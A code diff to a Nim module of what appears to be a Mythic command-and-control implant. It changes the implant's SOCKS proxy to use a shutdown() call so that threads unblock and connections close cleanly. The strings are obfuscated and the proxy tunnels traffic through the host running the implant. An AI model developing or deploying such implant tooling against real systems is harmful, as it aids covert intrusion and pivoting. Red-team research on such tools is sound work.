@@ -3,6 +3,18 @@ import ../utils/m_responses
 import ../utils/debug
 import ../utils/strenc
 
+# C-level shutdown() to send TCP FIN and unblock blocking recv/send in threads
+# Windows: runtime load from ws2_32.dll (avoids __imp_shutdown static link error)
+# POSIX: standard sys/socket.h link
+when defined(windows):
+  proc cShutdown(fd: cint, how: cint): cint {.importc: "shutdown", dynlib: "ws2_32".}
+else:
+  proc cShutdown(fd: cint, how: cint): cint {.importc: "shutdown", header: "<sys/socket.h>".}
+
+# Constant 1 = SHUT_WR (POSIX) = SD_SEND (Windows) - close write side, send FIN, keep reading
+proc shutdownSocket(fd: SocketHandle) =
+  discard cShutdown(fd.cint, 1.cint)
+
 # SOCKS5 Protocol Constants
 const
   SOCKS5_VERSION = 0x05'u8
@@ -346,16 +358,16 @@ proc socks*(taskId: string, params: JsonNode): JsonNode =
     of obf("stop"):
       socksActive = false
       
-      # Close all connections - set active=false and close sockets to unblock threads
+      # Shutdown all sockets to send FIN and unblock threads - don't join here
+      # to avoid blocking the agent. checkActiveSocksConnections will handle
+      # full cleanup (join + free) once threads exit naturally after shutdown.
       for serverId, conn in activeSocksConnections:
         conn.active = false
         if not conn.sharedPtr.isNil:
           conn.sharedPtr.active = false
         if conn.state == Connected:
-          try: conn.socket.close()
+          try: shutdownSocket(conn.socket.getFd())
           except: discard
-      
-      activeSocksConnections.clear()
       
       result = mythicSuccess(taskId, obf("SOCKS proxy stopped"))
       result[obf("completed")] = %true
@@ -379,15 +391,17 @@ proc handleSocksMessages*(messages: seq[JsonNode]): seq[JsonNode] =
     debug &"[DEBUG] SOCKS: Message for connection {serverId}, exit={exit}"
     
     if exit:
-      # Mark connection for closure and close socket to unblock reader thread
+      # Mark connection for closure and shutdown socket to unblock reader thread
       if activeSocksConnections.hasKey(serverId):
         var conn = activeSocksConnections[serverId]
         # Set active=false in BOTH the ref object and the shared object
         conn.active = false
         if not conn.sharedPtr.isNil:
           conn.sharedPtr.active = false
-        # Close socket to interrupt blocking recv in reader thread
+        # Shutdown socket to send FIN and interrupt blocking recv in reader thread
         if conn.state == Connected:
+          try: shutdownSocket(conn.socket.getFd())
+          except: discard
           try: conn.socket.close()
           except: discard
         debug &"[DEBUG] SOCKS: Marked connection {serverId} for cleanup (reader will drain remaining data)"
@@ -474,7 +488,9 @@ proc checkActiveSocksConnections*(): seq[JsonNode] =
     if activeSocksConnections.hasKey(serverId):
       let conn = activeSocksConnections[serverId]
       if conn.state == Connected:
-        # Close socket first to unblock any blocking recv/send in threads
+        # Shutdown socket first to send FIN and unblock blocking recv/send in threads
+        try: shutdownSocket(conn.socket.getFd())
+        except: discard
         try: conn.socket.close()
         except: discard
         
